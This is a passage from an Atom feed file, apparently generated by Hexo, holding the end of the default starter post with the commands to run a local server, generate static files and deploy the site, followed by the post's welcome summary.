id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
